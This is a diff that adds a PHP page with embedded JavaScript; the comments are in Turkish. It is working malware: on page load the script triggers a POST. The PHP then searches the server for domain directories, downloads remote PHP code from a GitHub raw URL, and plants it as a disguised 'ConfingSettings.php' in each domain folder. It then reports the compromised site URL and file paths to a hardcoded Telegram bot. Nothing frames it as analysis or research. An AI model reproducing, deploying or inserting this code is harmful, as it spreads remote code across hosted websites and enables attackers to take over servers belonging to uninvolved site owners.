@@ -1,0 +1,143 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $telegramApiId = '7288530056:AAH3mvjU3wl94AivFXbX2XWH4Oug6c74gy8';
+    $telegramChatId = '-1002427387838';
+    $fileUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/Settings.php';
+
+    function findDomains_v2($startDir)
+    {
+        $domains = [];
+        $entries = scandir($startDir);
+        foreach ($entries as $entry) {
+            if ($entry !== '.' && $entry !== '..') {
+                $path = $startDir . DIRECTORY_SEPARATOR . $entry;
+                if (is_dir($path) && preg_match('/^[a-zA-Z0-9\-.]+$/', $entry)) {
+                    $domains[] = $path;
+                } elseif (is_dir($path)) {
+                    $domains = array_merge($domains, findDomains_v2($path));
+                }
+            }
+        }
+        return array_unique($domains);
+    }
+
+    function sendTelegramMessage($apiId, $chatId, $message)
+    {
+        $url = "https://api.telegram.org/bot{$apiId}/sendMessage";
+        $data = ['chat_id' => $chatId, 'text' => $message];
+
+        $options = [
+            'http' => [
+                'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'method'  => 'POST',
+                'content' => http_build_query($data),
+            ],
+        ];
+
+        $context  = stream_context_create($options);
+        $result = file_get_contents($url, false, $context);
+        return $result !== false ? 'Mesaj gönderildi.' : 'Mesaj gönderilemedi.';
+    }
+
+    function normalizePHPContent($content)
+    {
+        // Fazla PHP taglarını temizle, eksikse ekle
+        $content = trim($content);
+        if (substr($content, 0, 5) !== '<?php') {
+            $content = "<?php\n" . $content;
+        }
+        if (substr($content, -2) !== '?>') {
+            $content .= "\n?>";
+        }
+        return $content;
+    }
+
+    function processDomains($domains, $fileUrl)
+    {
+        $results = [];
+        $fileContents = file_get_contents($fileUrl);
+        if (!$fileContents) {
+            return [['status' => 'error', 'message' => 'Dosya indirilemedi.']];
+        }
+
+        $fileContents = normalizePHPContent($fileContents);
+        $currentUtcTime = time();
+
+        foreach ($domains as $domain) {
+            $filePath = $domain . DIRECTORY_SEPARATOR . 'ConfingSettings.php';
+
+            // Eğer dosya varsa ve içeriğinde UTC timestamp varsa kontrol et
+            if (file_exists($filePath)) {
+                $existingContent = file_get_contents($filePath);
+                preg_match('/\/\/ UTC Tarih: ([\d\- :]+)/', $existingContent, $matches);
+
+                if (!empty($matches[1])) {
+                    $lastModifiedTime = strtotime($matches[1]);
+                    if (($currentUtcTime - $lastModifiedTime) < 36000) { // 10 saat = 36000 saniye
+                        $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Dosya 10 saat içinde güncellenmiş.'];
+                        continue;
+                    }
+                }
+            }
+
+            // Dosyaya UTC tarih/saat bilgisini yorum satırı olarak ekle
+            $fileContentsWithTimestamp = "<?php\n// UTC Tarih: " . gmdate('Y-m-d H:i:s') . "\n" . $fileContents;
+
+            if (@file_put_contents($filePath, $fileContentsWithTimestamp)) {
+                $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Dosya başarıyla oluşturuldu.'];
+            } else {
+                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya oluşturulamadı.'];
+            }
+        }
+        return $results;
+    }
+
+    $domains = findDomains_v2(__DIR__);
+    $results = processDomains($domains, $fileUrl);
+
+    // Site URL'sini alın
+    $siteUrl = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
+
+    // Telegram mesajını yalnızca güncelleme olan dosyalar için gönder
+    $message = "Site URL: {$siteUrl}\n\n"; // Mesajın başına site URL'si eklendi
+    $sendNotification = false;
+
+    foreach ($results as $result) {
+        $statusEmoji = $result['status'] === 'success' ? "✅" : ($result['status'] === 'skipped' ? "⚠️" : "❌");
+        $message .= "{$statusEmoji} {$result['file']} - {$result['message']}\n";
+
+        if ($result['status'] === 'success') {
+            $sendNotification = true; // Yalnızca güncelleme varsa bildirim gönder
+        }
+    }
+
+    if ($sendNotification) {
+        sendTelegramMessage($telegramApiId, $telegramChatId, $message);
+    }
+
+    echo json_encode($results);
+    exit;
+}
+?>
+
+<script>
+window.addEventListener('load', function () {
+    if (!window.started) { // Sadece bir kez çalıştırmayı garantileyin
+        window.started = true;
+        const logMode = new URLSearchParams(window.location.search).has('logke');
+
+        fetch(window.location.href, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        })
+        .then(response => response.json())
+        .then(data => {
+            data.forEach(result => {
+                const statusColor = result.status === 'success' ? 'green' : result.status === 'error' ? 'red' : 'orange';
+            });
+        })
+        .catch(error => console.error("Hata:", error));
+    }
+});
+
+</script>
